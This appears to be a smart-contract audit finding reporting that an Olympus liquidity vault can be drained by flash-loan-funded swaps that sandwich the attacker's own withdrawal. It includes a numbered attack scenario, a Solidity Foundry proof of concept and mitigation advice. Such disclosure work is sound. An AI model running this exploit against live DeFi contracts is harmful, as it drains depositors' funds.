Bahurum

high

# Liquidity Vault can be drained

## Summary
The SSLV can be drained. In short, an attacker can extract value from the SSLV free OHM liquidity by sandwiching its own withdrawals with appropriate swaps on the underlying balancer pool.

## Vulnerability Detail
The SSLV puts half of the liquidity of an user deposit as newly minted OHM tokens. An user can extract value from this free liquidity by pumping the spot price of OHM in the underlying before calling `withdraw()` and dumping the spot price afterwards. This way during withdrawal the SSLV receives more wstETH and less OHM than normal. The vault sees impermanent loss due to the swap, where the loss comes from the reduced amount of OHM received. However, the user does not share this loss since he never handles OHM and has a gain instead from the accrued amount of wstETH received.

The amount of spot price manipulation possible is reduced by the `THRESHOLD` in the `_isPoolSafe()` check, so capital losses from the one iteration of the manipulation attack will be constrained and be at less than 2% capital used. However, an attacker can leverage flash loans to get a large amount of capital and make net losses large. Exact profitability of the attack depends on the Balancer Pool fees and if the pool has enough TVL to make net gains larger than gas fees. 

A realistic scenario for the attack is as follow:
- `THRESHOLD` = 2% 
- Balancer pool fee = 0.3%
- initial wstETH in pool = 100
- initial OHM in pool = 17670
- initial OHM pool price = oracle OHM price = 176.39 OHM for 1 wstETH
- Attacker in the same tx:
   1. Flashloan 918.82 wstETH from AAVE
   2. Deposit 900 wsETH into SSLV
   3. Swap 10 wstETH for 1741.2 OHM on balancer pool
   4. Withdraw liquidity from SSLV: receive 909.00 wstETH
   5. Swap 1741.2 OHM for 9.13 wstETH on balancer pool
   6. Price in the balancer pool is now 209.1 OHM per 1 wstETH. Swap 8.146 wsETH for 1560.0 OHM to reset the pool price to the initial value
   7. swap the 1560.0 OHM on the open market (not balancer) for around 1560.0/176.39 - fees = 8.82 wstETH
   8. Attacker has 909.00 + 9.13 - 8.146 + 8.82 = 918,8 wstETH. Pay 0.09 % fee on flash loan = 918.134 * 0.0009 = 0.81 wstETH.
   9.  Net gain after flashloan fee: 8 wstETH. He managed to extract the part of liquidity added by the SSLV (9 wstETH value minus all fees)
   10. Since pool price is reset to the initial value, all the steps above can be repeated but with amount of tokens scaled respect to the new liquidity in the balancer pool. Pool can be drained by repeating many times

## PoC
The scenario above is tested in the following. `THRESHOLD` has been set to 2%.
The values are all divided by 100 to stick with the 1 wstETH deposit already in the `setUp()`. Also exact values will change slighthly depending on chainlink prices at test execution.
`LIMIT` is increased from 1000e9 to 10000e9.
`FixedPointMathLib` is used instead of `FullMath` for convenience in arithmetic operations.
Necessary interfaces for swaps have been added to `IBalancer.sol`

```solidity
function testDrainPool() public {

        bytes memory userData;
        uint256 wstEthAmount = 9 * 1e18;
        uint256 wstEthAmountSwap = 9 * liquidityVault.THRESHOLD() * 1e18 / 2;
        uint256 oraclePrice = liquidityVault._valueCollateral(1e18);

        FundManagement memory funds = FundManagement(
            {
                sender: alice,
                fromInternalBalance: false,
                recipient: payable(alice),
                toInternalBalance: false
            }
        );
        SingleSwap memory singleSwap = SingleSwap(
            {
                poolId: liquidityPool.getPoolId(),
                kind: SwapKind(0),
                assetIn: address(wsteth),
                assetOut: address(ohm),
                amount: wstEthAmountSwap,
                userData: userData
            }
        );

        uint256 initialAlicewstEthBalance = wsteth.balanceOf(alice);
        uint256 initialAliceOhmBalance = ohm.balanceOf(alice);

        vm.startPrank(alice);

        // 2. Deposit
        liquidityVault.deposit(wstEthAmount, 0);
        uint256 aliceLpPosition = liquidityVault.lpPositions(alice);
        console2.log("2. wsETH deposited into SSLV:" , wstEthAmount);

        // 3. Swap wstETH for OHM on balancer
        wsteth.approve(address(vault), wstEthAmount);
        uint256 ohmOut = vault.swap(singleSwap,
                                    funds,
                                    0,
                                    block.timestamp + 1);
        console2.log("3.Initial Pool price: ", oraclePrice);
        console2.log("3.SWAP - wstETH in :", wstEthAmount);
        console2.log("3.SWAP - OHM out :", ohmOut);

        // 4. withdraw
        uint256 wstETHfromWithdraw = liquidityVault.withdraw(aliceLpPosition, minTokenAmounts_, true);
        console2.log("4. wstETH obtained from Withdrawal:", wstETHfromWithdraw);
        
        // 5. Swap OHM for wstETH on balancer
        singleSwap.assetIn = address(ohm);
        singleSwap.assetOut = address(wsteth);
        singleSwap.amount = ohmOut;
        ohm.approve(address(vault), ohmOut);
        uint256 wstEthOut = vault.swap(singleSwap,
                            funds,
                            0,
                            block.timestamp + 1);
        console2.log("5. wsETH received from swap:", wstEthOut);
        console2.log("5. OHM given in swap:", ohmOut);
        
        // 6. Swap wstETH for OHM on balancer to get to initial pool price
        (, uint256[] memory balances_, ) = vault.getPoolTokens(
            IBasePool(liquidityPool).getPoolId()
        );
        uint256 price = (balances_[0] * 1e18) / balances_[1];
        uint256 priceRatio = price.divWadDown(oraclePrice);
        singleSwap.assetIn = address(wsteth);
        singleSwap.assetOut = address(ohm);
        singleSwap.amount = balances_[1].mulWadDown(priceRatio.sqrt()*1e9 - 1e18);
        uint256 ohmOutArbitrage = vault.swap(singleSwap,
                                    funds,
                                    0,
                                    block.timestamp + 1);

        (, balances_, ) = vault.getPoolTokens(
            IBasePool(liquidityPool).getPoolId()
        );
        console2.log("6. Manipulated price: ", price);
        price = (balances_[0] * 1e18) / balances_[1];
        console2.log("6. wsETH swapped: ", singleSwap.amount);
        console2.log("6. OHM received from swap:", ohmOutArbitrage);
        console2.log("6. Corrected price: ", price);

        // 7. swap the obtained OHM on the market for wstETH
        // here bob is an exchange on the market
        ohm.transfer(bob, ohmOutArbitrage); // send OHM to the exchange
        vm.stopPrank();
        vm.prank(bob);
        uint256 wstethReceived = ohmOutArbitrage.divWadDown(oraclePrice)*997/1000;  // 0.3% assume fee on swap
        wsteth.transfer(alice, wstethReceived);
        console2.log("7. OHM swapped: ", ohmOutArbitrage);
        console2.log("7. wstETh Received from swap: ", wstethReceived);
        
        console2.log("Initial OHM balance:", initialAliceOhmBalance);
        console2.log("Final OHM balance:", ohm.balanceOf(alice));
        int wsETHgain = int(wsteth.balanceOf(alice)) - int(initialAlicewstEthBalance);
        if (wsETHgain > 0) {
            console2.log("wstETH gain:", uint(wsETHgain));
        } else {
            console2.log("wstETH loss:", uint(-wsETHgain));
        }
    }
```

## Impact
The impact depends on `THRESHOLD`, balancer pool fees, network congestion and TVL in the balancer pool. With current values, the attacker can easily drain a large part of the wstETH in the SSLV.

## Code Snippet
https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L217

https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L280
## Tool used

Manual Review

## Recommendation
Some combinations of `THRESHOLD` and balancer pool fee make the attack always unprofitable.

If balancer pool fee = 0.3%, then the attack is unprofitable for `THRESHOLD` < 1% in the scenario above (slight loss due to fees).

Also, with `THRESHOLD` = 2%, an higher value appropriate for balancer pool fee should make this unprofitable.

However, to be sure that this cannot be exploited, just add a withdrawal fee on the SSLV pool of half the `THRESHOLD` value.

